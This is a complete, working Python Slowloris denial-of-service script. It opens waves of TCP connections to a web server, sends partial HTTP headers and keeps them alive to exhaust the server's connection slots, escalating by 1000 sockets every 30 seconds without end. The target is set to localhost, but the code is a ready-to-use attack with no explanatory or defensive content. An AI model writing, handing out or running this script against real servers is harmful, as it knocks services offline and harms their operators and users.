import socket
import time
import threading

def slowloris_attack(target_host, target_port, initial_sockets, increment, delay):
    sockets = []

    def create_sockets(num_sockets):
        for _ in range(num_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_host, target_port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n".encode("utf-8"))
                sockets.append(s)
            except socket.error:
                break

    def maintain_sockets():
        while True:
            for s in sockets:
                try:
                    s.send(f"X-a: {time.time()}\r\n".encode("utf-8"))
                except socket.error:
                    sockets.remove(s)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target_host, target_port))
                        s.send(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n".encode("utf-8"))
                        sockets.append(s)
                    except socket.error:
                        continue
            time.sleep(delay)

    # Initial Sockets
    create_sockets(initial_sockets)
    thread = threading.Thread(target=maintain_sockets)
    thread.start()

    # Incrementally Add More Sockets
    while True:
        create_sockets(increment)
        time.sleep(30)  # Wait 30 seconds before adding more

# Settings
target_host = "127.0.0.1"  # Localhost
target_port = 8080  # Port the server is running on
initial_sockets = 1000  # Initial number of sockets
increment = 1000  # Increment of sockets to add
delay = 5  # Delay in seconds between sending partial headers

# Run the attack
slowloris_attack(target_host, target_port, initial_sockets, increment, delay)
